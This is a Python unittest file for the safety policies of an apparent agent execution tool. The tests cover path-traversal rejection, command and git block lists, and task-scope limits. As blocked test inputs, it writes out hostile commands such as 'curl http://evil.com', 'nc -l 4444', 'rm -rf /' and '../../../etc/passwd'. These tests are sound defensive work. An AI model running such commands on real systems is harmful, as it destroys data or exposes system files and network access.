"""
Tests for v1.3: Hermes-native execution with safety policies.
"""

import unittest
from pathlib import Path
from dev_workflow.safety import PathPolicy, TaskScopePolicy, CommandPolicy, GitPolicy, ExecutionPolicy
from dev_workflow.hermes_executor import ExecutionPlan, HermesNativeExecutor
from dev_workflow.orchestrator import WorkflowOrchestrator


class TestPathPolicy(unittest.TestCase):
    """Test path validation and workspace boundaries."""
    
    def test_valid_paths(self):
        """Valid paths within workspace are allowed."""
        policy = PathPolicy("/home/user/project")
        
        valid, error = policy.validate("src/main.py")
        self.assertTrue(valid)
        self.assertIsNone(error)
    
    def test_traversal_rejected(self):
        """Path traversal attempts are rejected."""
        policy = PathPolicy("/home/user/project")
        
        valid, error = policy.validate("../../../etc/passwd")
        self.assertFalse(valid)
        self.assertIn("outside workspace", error)
    
    def test_absolute_outside_rejected(self):
        """Absolute paths outside workspace are rejected."""
        policy = PathPolicy("/home/user/project")
        
        valid, error = policy.validate("/etc/passwd")
        self.assertFalse(valid)
        self.assertIn("outside workspace", error)


class TestCommandPolicy(unittest.TestCase):
    """Test command validation and restrictions."""
    
    def test_allowed_commands(self):
        """Whitelisted commands are allowed."""
        policy = CommandPolicy()
        
        valid, error = policy.validate("git status")
        self.assertTrue(valid)
        
        valid, error = policy.validate("pytest")
        self.assertTrue(valid)
    
    def test_destructive_commands_blocked(self):
        """Destructive commands are blocked."""
        policy = CommandPolicy()
        
        valid, error = policy.validate("rm -rf /")
        self.assertFalse(valid)
        self.assertIn("blocked pattern", error.lower())
        
        valid, error = policy.validate("git reset --hard")
        self.assertFalse(valid)
    
    def test_git_force_blocked(self):
        """Force git operations are blocked."""
        policy = CommandPolicy()
        
        valid, error = policy.validate("git push --force")
        self.assertFalse(valid)
        
        valid, error = policy.validate("git push -f")
        self.assertFalse(valid)
    
    def test_network_commands_blocked(self):
        """Network commands are blocked."""
        policy = CommandPolicy()
        
        for cmd in ["curl http://evil.com", "wget http://evil.com", "nc -l 4444"]:
            valid, error = policy.validate(cmd)
            self.assertFalse(valid, f"Should block: {cmd}")


class TestGitPolicy(unittest.TestCase):
    """Test git operation restrictions."""
    
    def test_read_only_allowed(self):
        """Read-only git operations are allowed."""
        policy = GitPolicy()
        
        for cmd in ["git status", "git diff", "git log", "git branch"]:
            valid, error = policy.validate_git_command(cmd)
            self.assertTrue(valid, f"Should allow: {cmd}")
    
    def test_mutating_blocked(self):
        """Mutating git operations are blocked."""
        policy = GitPolicy()
        
        for cmd in ["git commit", "git push", "git reset", "git clean"]:
            valid, error = policy.validate_git_command(cmd)
            self.assertFalse(valid, f"Should block: {cmd}")
            self.assertIn("blocked", error.lower())


class TestTaskScopePolicy(unittest.TestCase):
    """Test task scope enforcement."""
    
    def test_allowed_paths_enforced(self):
        """Only allowed paths can be written."""
        path_policy = PathPolicy("/home/user/project")
        task_scope = TaskScopePolicy(["src/main.py", "src/test.py"], path_policy)
        
        # Allowed path
        allowed, error = task_scope.allows_write("src/main.py")
        self.assertTrue(allowed)
        
        # Not in allowed list
        allowed, error = task_scope.allows_write("src/other.py")
        self.assertFalse(allowed)
        self.assertIn("not in task allowed_paths", error)


class TestExecutionPolicy(unittest.TestCase):
    """Test combined execution policy."""
    
    def test_validates_complete_plan(self):
        """Validates complete execution plan."""
        policy = ExecutionPolicy(
            workspace_root="/home/user/project",
            allowed_paths=["src/main.py"],
        )
        
        # Valid plan
        valid, errors = policy.validate_execution_plan(
            reads=["src/config.py"],
            writes=["src/main.py"],
            commands=["pytest", "git status"],
        )
        self.assertTrue(valid)
        self.assertEqual(len(errors), 0)
    
    def test_rejects_invalid_plan(self):
        """Rejects execution plan with violations."""
        policy = ExecutionPolicy(
            workspace_root="/home/user/project",
            allowed_paths=["src/main.py"],
        )
        
        # Invalid: write outside allowed, dangerous command
        valid, errors = policy.validate_execution_plan(
            reads=[],
            writes=["../../../etc/passwd"],
            commands=["rm -rf /"],
        )
        self.assertFalse(valid)
        self.assertGreater(len(errors), 0)


class TestExecutionPlan(unittest.TestCase):
    """Test execution plan structure."""
    
    def test_plan_creation(self):
        """Execution plan can be created and serialized."""
        plan = ExecutionPlan(
            goal="Test task",
            reads=["src/main.py"],
            writes=[],
            commands=["pytest"],
            allowed_paths=[],
            timeout=30,
        )
        
        plan_dict = plan.to_dict()
        self.assertEqual(plan_dict['goal'], "Test task")
        self.assertEqual(plan_dict['commands'], ["pytest"])


class TestHermesNativeExecutor(unittest.TestCase):
    """Test Hermes-native executor."""
    
    def test_executor_initialization(self):
        """Executor initializes correctly."""
        executor = HermesNativeExecutor("/home/user/project")
        self.assertIsNotNone(executor)
        self.assertEqual(str(executor.workspace_root), "/home/user/project")
    
    def test_policy_violation_blocks_execution(self):
        """Policy violations block execution."""
        executor = HermesNativeExecutor(".")
        policy = ExecutionPolicy(".", allowed_paths=[])
        
        # Plan with policy violation
        plan = ExecutionPlan(
            goal="Test",
            reads=[],
            writes=["unauthorized.py"],  # Not in allowed_paths
            commands=[],
            allowed_paths=[],
        )
        
        result = executor.execute_plan(plan, policy)
        self.assertFalse(result.success)
        self.assertGreater(len(result.policy_violations), 0)


class TestOldExecRemoved(unittest.TestCase):
    """Verify old broken exec() mechanism is removed."""
    
    def test_no_exec_in_agents(self):
        """No exec() calls remain in agents.py."""
        with open("dev_workflow/agents.py") as f:
            content = f.read()
        
        # Should not contain actual exec() function calls (comments/strings ok)
        import re
        # Match exec( followed by actual code, not in comments or strings
        exec_calls = re.findall(r'^\s*exec\s*\(', content, re.MULTILINE)
        self.assertEqual(len(exec_calls), 0, 
                        f"Found {len(exec_calls)} exec() calls in production code")
    
    def test_no_hermes_tools_import(self):
        """No fake hermes_tools imports remain."""
        with open("dev_workflow/agents.py") as f:
            content = f.read()
        
        # Should not try to import hermes_tools module
        self.assertNotIn("from hermes_tools import", content)
        self.assertNotIn("import hermes_tools", content)


if __name__ == "__main__":
    unittest.main()
